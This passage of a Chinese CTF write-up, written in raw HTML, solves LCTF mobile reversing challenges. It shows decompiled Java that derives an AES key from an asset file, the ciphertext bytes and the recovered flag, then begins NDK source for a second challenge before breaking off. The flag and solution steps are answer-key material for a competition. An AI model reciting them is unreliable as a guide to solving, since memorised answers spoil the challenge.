YaHei&#39;;">这一题的确是个福利题...并没有涉及到dex函数隐藏等小技巧，只是简单的使用proguard进行了混淆。可以静态也可动态（动态先改掉debug检测，还不如直接静态看一下），那么，关键部分源码：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  java"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="java keyword">private</code>&nbsp;<code class="java keyword">void</code>&nbsp;<code class="java plain">getKey(){</code></div><div class="line number2 index1 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">try</code>&nbsp;<code class="java plain">{</code></div><div class="line number3 index2 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">InputStream&nbsp;stream&nbsp;=&nbsp;</code><code class="java keyword">this</code><code class="java plain">.getResources().getAssets().open(</code><code class="java string">"url.png"</code><code class="java plain">);</code></div><div class="line number4 index3 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">int</code>&nbsp;<code class="java plain">v&nbsp;=&nbsp;stream.available();</code></div><div class="line number5 index4 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">byte</code><code class="java plain">[]&nbsp;bs&nbsp;=&nbsp;</code><code class="java keyword">new</code>&nbsp;<code class="java keyword">byte</code><code class="java plain">[v];</code></div><div class="line number6 index5 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">stream.read(bs,&nbsp;</code><code class="java value">0</code><code class="java plain">,&nbsp;v);</code></div><div class="line number7 index6 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">byte</code><code class="java plain">[]&nbsp;keybyte&nbsp;=&nbsp;</code><code class="java keyword">new</code>&nbsp;<code class="java keyword">byte</code><code class="java plain">[</code><code class="java value">16</code><code class="java plain">];</code></div><div class="line number8 index7 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">System.arraycopy(bs,&nbsp;</code><code class="java value">144</code><code class="java plain">,&nbsp;keybyte,&nbsp;</code><code class="java value">0</code><code class="java plain">,&nbsp;</code><code class="java value">16</code><code class="java plain">);</code></div><div class="line number9 index8 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">this</code><code class="java plain">.key&nbsp;=&nbsp;</code><code class="java keyword">new</code>&nbsp;<code class="java plain">String(keybyte,&nbsp;</code><code class="java string">"utf-8"</code><code class="java plain">);</code></div><div class="line number10 index9 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number11 index10 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">catch</code>&nbsp;<code class="java plain">(Exception&nbsp;e){</code></div><div class="line number12 index11 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">e.printStackTrace();</code></div><div class="line number13 index12 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number14 index13 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java comments">//code</code></div><div class="line number15 index14 alt2"><code class="java plain">}</code></div><div class="line number16 index15 alt1"><code class="java keyword">private</code>&nbsp;<code class="java plain">String&nbsp;handle(String&nbsp;naive){</code></div><div class="line number17 index16 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">try</code>&nbsp;<code class="java plain">{</code></div><div class="line number18 index17 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">naive.getBytes(</code><code class="java string">"utf-8"</code><code class="java plain">);</code></div><div class="line number19 index18 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">StringBuilder&nbsp;str&nbsp;=&nbsp;</code><code class="java keyword">new</code>&nbsp;<code class="java plain">StringBuilder();</code></div><div class="line number20 index19 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">for</code>&nbsp;<code class="java plain">(</code><code class="java keyword">int</code>&nbsp;<code class="java plain">i&nbsp;=&nbsp;</code><code class="java value">0</code><code class="java plain">;&nbsp;i&nbsp;&lt;&nbsp;naive.length();&nbsp;i&nbsp;+=&nbsp;</code><code class="java value">2</code><code class="java plain">)&nbsp;{</code></div><div class="line number21 index20 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">str.append(naive.charAt(i&nbsp;+&nbsp;</code><code class="java value">1</code><code class="java plain">));</code></div><div class="line number22 index21 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">str.append(naive.charAt(i));</code></div><div class="line number23 index22 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number24 index23 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">return</code>&nbsp;<code class="java plain">str.toString();</code></div><div class="line number25 index24 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code><code class="java keyword">catch</code>&nbsp;<code class="java plain">(UnsupportedEncodingException&nbsp;e){</code></div><div class="line number26 index25 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">e.printStackTrace();</code></div><div class="line number27 index26 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number28 index27 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">return</code>&nbsp;<code class="java keyword">null</code><code class="java plain">;</code></div><div class="line number29 index28 alt2"><code class="java plain">}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code></div><div class="line number30 index29 alt1"><code class="java keyword">protected</code>&nbsp;<code class="java keyword">void</code>&nbsp;<code class="java plain">Encryption(</code><code class="java keyword">byte</code><code class="java plain">[]&nbsp;key){</code></div><div class="line number31 index30 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">try</code>&nbsp;<code class="java plain">{</code></div><div class="line number32 index31 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code>&nbsp;<code class="java plain">(key&nbsp;==&nbsp;</code><code class="java keyword">null</code><code class="java plain">)&nbsp;{</code></div><div class="line number33 index32 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">byte</code><code class="java plain">[]&nbsp;bytes&nbsp;=&nbsp;</code><code class="java string">""</code><code class="java plain">.getBytes(</code><code class="java string">"utf-8"</code><code class="java plain">);</code></div><div class="line number34 index33 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">MessageDigest&nbsp;messageDigest&nbsp;=&nbsp;MessageDigest.getInstance(</code><code class="java string">"MD5"</code><code class="java plain">);</code></div><div class="line number35 index34 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">byte</code><code class="java plain">[]&nbsp;bytes1&nbsp;=&nbsp;messageDigest.digest(bytes);</code></div><div class="line number36 index35 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">secretKeySpec&nbsp;=&nbsp;</code><code class="java keyword">new</code>&nbsp;<code class="java plain">SecretKeySpec(bytes1,&nbsp;</code><code class="java string">"AES"</code><code class="java plain">);</code></div><div class="line number37 index36 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">cipher&nbsp;=&nbsp;Cipher.getInstance(</code><code class="java string">"AES/ECB/PKCS5Padding"</code><code class="java plain">);</code></div><div class="line number38 index37 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number39 index38 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">else</code>&nbsp;<code class="java plain">{</code></div><div class="line number40 index39 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">secretKeySpec&nbsp;=&nbsp;</code><code class="java keyword">new</code>&nbsp;<code class="java plain">SecretKeySpec(key,&nbsp;</code><code class="java string">"AES"</code><code class="java plain">);</code></div><div class="line number41 index40 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">cipher&nbsp;=&nbsp;Cipher.getInstance(</code><code class="java string">"AES/ECB/PKCS5Padding"</code><code class="java plain">);</code></div><div class="line number42 index41 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number43 index42 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}except{</code></div><div class="line number44 index43 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java comments">//...</code></div><div class="line number45 index44 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number46 index45 alt1"><code class="java plain">}</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">从url.png中获得key，然后使用handle函数进行处理（奇偶位互换）作为最终AES加密的key。flag密文:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  java"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="java keyword">byte</code><code class="java plain">[]&nbsp;bye&nbsp;=&nbsp;{</code><code class="java value">21</code><code class="java plain">,-</code><code class="java value">93</code><code class="java plain">,-</code><code class="java value">68</code><code class="java plain">,-</code><code class="java value">94</code><code class="java plain">,</code><code class="java value">86</code><code class="java plain">,</code><code class="java value">117</code><code class="java plain">,-</code><code class="java value">19</code><code class="java plain">,-</code><code class="java value">68</code><code class="java plain">,-</code><code class="java value">92</code><code class="java plain">,</code><code class="java value">33</code><code class="java plain">,</code><code class="java value">50</code><code class="java plain">,</code><code class="java value">118</code><code class="java plain">,</code><code class="java value">16</code><code class="java plain">,</code><code class="java value">13</code><code class="java plain">,</code><code class="java value">1</code><code class="java plain">,-</code><code class="java value">15</code><code class="java plain">,-</code><code class="java value">13</code><code class="java plain">,</code><code class="java value">3</code><code class="java plain">,</code><code class="java value">4</code><code class="java plain">,</code><code class="java value">103</code><code class="java plain">,-</code><code class="java value">18</code><code class="java plain">,</code><code class="java value">81</code><code class="java plain">,</code><code class="java value">30</code><code class="java plain">,</code><code class="java value">68</code><code class="java plain">,</code><code class="java value">54</code><code class="java plain">,-</code><code class="java value">93</code><code class="java plain">,</code><code class="java value">44</code><code class="java plain">,-</code><code class="java value">23</code><code class="java plain">,</code><code class="java value">93</code><code class="java plain">,</code><code class="java value">98</code><code class="java plain">,</code><code class="java value">5</code><code class="java plain">,</code><code class="java value">59</code><code class="java plain">};</code></div><div class="line number2 index1 alt1"><code class="java keyword">new</code>&nbsp;<code class="java plain">String(bye);</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用AES/ECB/PKCS5Padding，用key对选手输入进行加密，结果与flag密文进行比对；故解密时只需</span></p><p style="text-indent: 2em; text-align: left;"><span style="background-color: rgb(248, 248, 248);">init(Cipher.DECRYPT_MODE, secretKeySpec)；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">对flag密文进行解密即可。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">flag:LCTF{1t's_rea1ly_an_ea3y_ap4}</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">moblie 200</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先还是直接放出NDK部分源码...</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  java"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="java plain">std::string&nbsp;secret&nbsp;=&nbsp;</code><code class="java string">"dHR0dGlldmFodG5vZGllc3VhY2VibGxlaHNhdG5hd2k."</code><code class="java plain">;</code></div><div class="line number2 index1 alt1"><code class="java keyword">static</code>&nbsp;<code class="java keyword">const</code>&nbsp;<code class="java plain">std::string&nbsp;chars&nbsp;=</code></div><div class="line number3 index2 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</code></div><div class="line number4 index3 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java string">"abcdefghijklmnopqrstuvwxyz"</code></div><div class="line number5 index4 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java string">"0123456789+/"</code><code class="java plain">;</code></div><div class="line number6 index5 alt1"><code class="java keyword">static</code>&nbsp;<code class="java plain">inline&nbsp;bool&nbsp;is_base(unsigned&nbsp;</code><code class="java keyword">char</code>&nbsp;<code class="java plain">c)&nbsp;{</code></div><div class="line number7 index6 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">return</code>&nbsp;<code class="java plain">(isalnum(c)&nbsp;||&nbsp;(c&nbsp;==&nbsp;</code><code class="java string">'+'</code><code class="java plain">)&nbsp;||&nbsp;(c&nbsp;==&nbsp;</code><code class="java string">'/'</code><code class="java plain">));</code></div><div class="line number8 index7 alt1"><code class="java plain">}</code></div><div class="line number9 index8 alt2"><code class="java plain">std::string&nbsp;encrypt(</code><code class="java keyword">char</code>&nbsp;<code class="java keyword">const</code><code class="java plain">*&nbsp;bytes_to_encode,&nbsp;unsigned&nbsp;</code><code class="java keyword">int</code>&nbsp;<code class="java plain">in_len)&nbsp;{</code></div><div class="line number10 index9 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">std::string&nbsp;ret;</code></div><div class="line number11 index10 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">int</code>&nbsp;<code class="java plain">i&nbsp;=&nbsp;</code><code class="java value">0</code><code class="java plain">;</code></div><div class="line number12 index11 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">int</code>&nbsp;<code class="java plain">j&nbsp;=&nbsp;</code><code class="java value">0</code><code class="java plain">;</code></div><div class="line number13 index12 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">unsigned&nbsp;</code><code class="java keyword">char</code>&nbsp;<code class="java plain">char_array_3[</code><code class="java value">3</code><code class="java plain">];</code></div><div class="line number14 index13 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">unsigned&nbsp;</code><code class="java keyword">char</code>&nbsp;<code class="java plain">char_array_4[</code><code class="java value">4</code><code class="java plain">];</code></div><div class="line number15 index14 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">while</code>&nbsp;<code class="java plain">(in_len--)&nbsp;{</code></div><div class="line number16 index15 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">char_array_3[i++]&nbsp;=&nbsp;*(bytes_to_encode++);</code></div><div class="line number17 index16 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code>&nbsp;<code class="java plain">(i&nbsp;==&nbsp;</code><code class="java value">3</code><code class="java plain">)&nbsp;{</code></div><div class="line number18 index17 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">char_array_4[</code><code class="java value">0</code><code class="java plain">]&nbsp;=&nbsp;(char_array_3[</code><code class="java value">0</code><code class="java plain">]&nbsp;&amp;&nbsp;</code><code class="java value">0xfc</code><code class="java plain">)&nbsp;&gt;&gt;&nbsp;</code><code class="java value">2</code><code class="java plain">;</code></div><div class="line number19 index18 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">char_array_4[</code><code class="java value">1</code><code class="java plain">]&nbsp;=&nbsp;((char_array_3[</code><code class="java value">0</code><code class="java plain">]&nbsp;&amp;&nbsp;</code><code class="java value">0x03</code><code class="java plain">)&nbsp;&lt;&lt;&nbsp;</code><code class="java value">4</code><code class="java plain">)&nbsp;+&nbsp;((char_array_3[</code><code class="java value">1</code><code class="java plain">]&nbsp;&amp;&nbsp;</code><code class="java value">0xf0</code><code class="java plain">)&nbsp;&gt;&gt;&nbsp;</code><code class="java value">4</code><code class="java plain">);</code></div><div class="line number20 index19 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">char_array_4[</code><code class="java value">2</code><code class="java plain">]&nbsp;=&nbsp;((char_array_3[</code><code class="java value">1</code><code class="java plain">]&nbsp;&amp;&nbsp;</code><code class="java value">0x0f</code><code class="java plain">)&nbsp;&lt;&lt;&nbsp;</code><code class="java value">2</code><code class="java plain">)&nbsp;+&nbsp;((char_array_3[</code><code class="java value">2</code><code class="java plain">]&nbsp;&amp;&nbsp;</code><code class="java value">0xc0</code><code class="java plain">)&nbsp;&gt;&gt;&nbsp;</code><code class="java value">6</code><code class="java plain">);</code></div><div class="line number21 index20 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">char_array_4[</code><code class="java value">3</code><code class="java plain">]&nbsp;=&nbsp;char_array_3[</code><code class="java value">2</code><code class="java plain">]&nbsp;&amp;&nbsp;</code><code class="java value">0x3f</code><code class="java plain">;</code></div><div class="line number22 index21 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">for</code><code class="java plain">(i&nbsp;=&nbsp;</code><code class="java value">0</code><code class="java plain">;&nbsp;(i&nbsp;&lt;</code><code class="java value">4</code><code class="java plain">)&nbsp;;&nbsp;i++)</code></div><div class="line number23 index22 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">ret&nbsp;+=&nbsp;chars[char_array_4[i]];</code></div><div class="line number24 index23 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">i&nbsp;=&nbsp;</code><code class="java value">0</code><code class="java plain">;</code></div><div class="line number25 index24 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number26 index25 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number27 index26 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code>&nbsp;<code class="java plain">(i)</code></div><div class="line number28 index27 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">{</code></div><div class="line number29 index28 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">for</code><code class="java plain">(j&nbsp;=&nbsp;i;&nbsp;j&nbsp;&lt;&nbsp;</code><code class="java value">3</code><code class="java plain">;&nbsp;j++)</code></div><div class="line number30 index29 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">char_array_3[j]&nbsp;=&nbsp;</code><code class="java string">'\0'</code><code class="java plain">;</code></div><div class="line number31 index30 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">char_array_4[</code><code class="java value">0</code><code class="java plain">]&nbsp;=&nbsp;(char_array_3[</code><code class="java value">0</code><code class="java plain">]&nbsp;&amp;&nbsp;</code><code class="java value">0xfc</code><code class="java plain">)&nbsp;&gt;&gt;&nbsp;</code><code class="java value">2</code><code class="java plain">;</code></div><div class="line number32 index31 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">char_array_4[</code><code class="java value">1</code><code class="java plain">]&nbsp;=&nbsp;((char_array_3[</code><code class="java value">0</code><code class="java plain">]&nbsp;&amp;&nbsp;</code><code class="java value">0x03</code><code class="java plain">)&nbsp;&lt;&lt;&nbsp;</code><code class="java value">4</code><code class="java plain">)&nbsp;+&nbsp;((char_array_3[</code><code class="java value">1</code><code class="java plain">]&nbsp;&amp;&nbsp;</code><code class="java value">0xf0</code><code class="java plain">)&nbsp;&gt;&gt;&nbsp;</code><code class="java value">4</code><code class="java plain">);</code></div><div class="line number33 index32 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">char_array_4[</code><code class="java value">2</code><code class="java plain">]&nbsp;=&nbsp;((char_array_3[</code><code class="java value">1</code><code class="java plain">]&nbsp;&amp;&nbsp;</code><code class="java value">0x0f</code><code class="java plain">)&nbsp;&lt;&lt;&nbsp;</code><code class="java value">2</code><code class="java plain">)&nbsp;+&nbsp;((char_array_3[</code><code class="java value">2</code><code class="java 